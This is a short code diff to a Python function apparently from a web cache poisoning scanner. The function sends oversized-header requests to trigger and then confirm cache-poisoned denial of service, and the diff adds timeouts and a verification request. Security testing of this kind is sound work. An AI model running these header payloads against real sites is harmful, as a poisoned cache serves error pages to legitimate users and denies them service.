@@ -18,7 +18,7 @@ def HHO(url, s, main_status_code, authent):
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""
         h = {"X-Oversized-Header-{}".format(i):"{}".format(big_value)}
         try:
-            req_hho = s.get(url, headers=h, auth=authent, allow_redirects=False)
+            req_hho = s.get(url, headers=h, auth=authent, allow_redirects=False, timeout=10)
             #print(req_hho.status_code)
             #print(h)
             if req_hho.status_code in [400, 413, 500, 502] and req_hho.status_code != main_status_code:
@@ -35,4 +35,8 @@ def HHO(url, s, main_status_code, authent):
             #traceback.print_exc()
             pass
     if cpdos_win:
-        print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HHO DOS | \033[34m{}\033[0m | PAYLOAD: {}".format(url, h))
+        req_hho_verify = s.get(url, auth=authent, allow_redirects=False, timeout=10)
+        if req_hho_verify.status_code in [400, 413, 500, 502] and req_hho_verify.status_code != main_status_code:
+            print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HHO DOS: {} | \033[34m{}\033[0m | PAYLOAD: {}".format(url, req_hho_verify.status_code, h))
+        else:
+            print("  \033[33m└── INTERESTING BEHAVIOR\033[0m | HHO DOS: {} | \033[34m{}\033[0m | PAYLOAD: {}".format(url, req_hho_verify.status_code, h))
